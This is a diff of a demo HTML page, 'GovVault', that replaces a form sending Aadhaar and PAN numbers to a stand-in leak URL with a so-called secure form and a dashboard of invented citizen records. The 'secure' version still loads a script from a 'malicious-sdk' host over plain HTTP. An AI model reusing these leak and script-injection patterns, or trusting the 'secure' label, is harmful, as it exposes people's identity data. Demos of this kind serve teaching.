@@ -8,23 +8,39 @@
   <script src="http://malicious-sdk.com/fake.js"></script>
 </head>
 <body>
-  <h1>GovVault - Unsecure Demo</h1>
+  <h1>GovVault - Secure Demo</h1>
 
-  <form action="http://example.com/leak" method="GET">
-    <label>Aadhaar Number:</label>
-    <input type="text" name="aadhaar" placeholder="Enter Aadhaar"><br>
-
-    <label>PAN Number:</label>
-    <input type="text" name="pan" placeholder="Enter PAN"><br>
-
-    <label>Location Access:</label>
-    <button onclick="getLocation()">Enable</button><br>
-
-    <label>Login:</label>
-    <input type="text" id="username" placeholder="Username">
-    <input type="password" id="password" placeholder="Password">
-    <button onclick="login()">Login</button>
+  <form id="secureForm">
+    <input type="text" name="aadhaar" placeholder="Enter Aadhaar" required>
+    <input type="text" name="pan" placeholder="Enter PAN" required>
+    <input type="text" id="username" placeholder="Username" required>
+    <input type="password" id="password" placeholder="Password" required>
+    <button type="submit">Login Securely</button>
   </form>
+
+  <div id="dashboard" class="hidden">
+    <h2>Welcome, <span id="userDisplay"></span></h2>
+    <div class="card">
+      <h3>🩺 Health Records</h3>
+      <p>Diseases: Hypertension, Asthma</p>
+      <p>Last Checkup: 12 Aug 2025</p>
+    </div>
+    <div class="card">
+      <h3>🆔 ID Verification</h3>
+      <p>Aadhaar: <span id="aadhaarDisplay"></span></p>
+      <p>PAN: <span id="panDisplay"></span></p>
+    </div>
+    <div class="card">
+      <h3>💳 Financial Info</h3>
+      <p>Bank Linked: Yes</p>
+      <p>Last Transaction: ₹2,450 (Sep 2025)</p>
+    </div>
+    <div class="card">
+      <h3>🚗 Citizen Services</h3>
+      <p>Driving Licence: Valid till 2028</p>
+      <p>eShram Registered: Yes</p>
+    </div>
+  </div>
 
   <script src="script.js"></script>
 </body>
